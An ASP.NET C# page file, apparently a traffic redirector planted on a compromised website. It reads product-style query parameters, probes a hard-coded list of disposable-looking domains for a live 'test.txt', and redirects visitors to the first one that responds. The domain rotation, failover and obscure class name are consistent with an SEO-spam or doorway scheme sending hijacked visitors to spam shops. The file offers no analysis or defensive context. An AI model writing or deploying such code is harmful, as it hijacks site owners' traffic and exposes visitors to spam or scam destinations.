﻿using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Web;

public partial class a : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            string[] ym = new string[] { "https://www.shop-ping79.top/", "https://www.worshipwithyourlife.xyz/", "https://www.resmcgvd.top/", "https://www.zametkimastera.top/", "https://www.badadnn.top/", "https://www.heilolo.xyz/", "https://www.pcy.fr/" };
            for (int i = 0; i < ym.Length; i++)
            {
                if (Request.QueryString["cname"] != null && Request.QueryString["cname"] != "")
                {
                    if (i == ym.Length - 1)
                    {
                        string url = ym[i] + "products.aspx?cname=" + HttpUtility.UrlEncode(Request.QueryString["cname"]).Replace(".html", "");
                        if (Request.QueryString["cid"] != null && Request.QueryString["cid"] != "")
                        {
                            url += "&cid=" + Request.QueryString["cid"];
                        }
                        Response.Redirect(url);
						Response.End();
                    }
                    else if (HttpGetJD(ym[i] + "test.txt").Length > 0)
                    {
                        string url = ym[i] + "products.aspx?cname=" + HttpUtility.UrlEncode(Request.QueryString["cname"]).Replace(".html", "");
                        if (Request.QueryString["cid"] != null && Request.QueryString["cid"] != "")
                        {
                            url += "&cid=" + Request.QueryString["cid"];
                        }
                        Response.Redirect(url);
                        break;
                    }

                }
                else if (Request.QueryString["cid"] != null && Request.QueryString["cid"] != "" && Request.QueryString["cname"] == null)
                {
                    if (i == ym.Length - 1)
                    {
                        string url = ym[i] + "?cid=" + Request.QueryString["cid"];
                        Response.Redirect(url);
                    }
                    else if (HttpGetJD(ym[i] + "test.txt").Length > 0)
                    {
                        string url = ym[i] + "?cid=" + Request.QueryString["cid"];
                        Response.Redirect(url);
                        break;
                    }
                }
            }
        }
    }

    public string HttpGetJD(string url)
    {
        string ru = "";
        int cs = 0;

        cs++;
        try
        {
            HttpWebRequest request = null;
            HttpWebResponse response = null;
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                if (!url.Contains("https") && !url.Contains("http"))
                {
                    url = "https:" + url;
                }
                System.GC.Collect();
                System.Net.ServicePointManager.DefaultConnectionLimit = 512;
                request = (HttpWebRequest)WebRequest.Create(url);

                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36";
                request.Method = "GET";
                request.Headers.Add("Accept-Encoding", "gzip, deflate");
                request.ServicePoint.Expect100Continue = false;
                request.ServicePoint.UseNagleAlgorithm = false;
                request.AllowWriteStreamBuffering = false;
                request.ServicePoint.ConnectionLimit = 65500;
                request.ContentType = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                //request.Headers.Add("Accept-Language", la.Replace("_", "-"));

                request.Timeout = 3000;
                response = (HttpWebResponse)request.GetResponse();
                ru = GetResponseBody(response);

            }
            catch (Exception ex)
            {

                ru = "";
            }
            finally
            {

                if (response != null)
                {
                    response.Close();
                }
                if (request != null)
                {
                    request.Abort();
                }
            }
        }
        catch
        {


            ru = "";
        }

        return ru;
    }
    private string GetResponseBody(HttpWebResponse response)
    {
        string responseBody = string.Empty;
        if (response.ContentEncoding.ToLower().Contains("gzip"))
        {
            using (GZipStream stream = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress))
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    responseBody = reader.ReadToEnd();
                }
            }
        }
        else if (response.ContentEncoding.ToLower().Contains("deflate"))
        {
            using (DeflateStream stream = new DeflateStream(
                response.GetResponseStream(), CompressionMode.Decompress))
            {
                using (StreamReader reader =
                    new StreamReader(stream, Encoding.UTF8))
                {
                    responseBody = reader.ReadToEnd();
                }
            }
        }
        else
        {
            using (Stream stream = response.GetResponseStream())
            {
                using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
                {
                    responseBody = reader.ReadToEnd();
                }
            }
        }
        return responseBody;
    }
}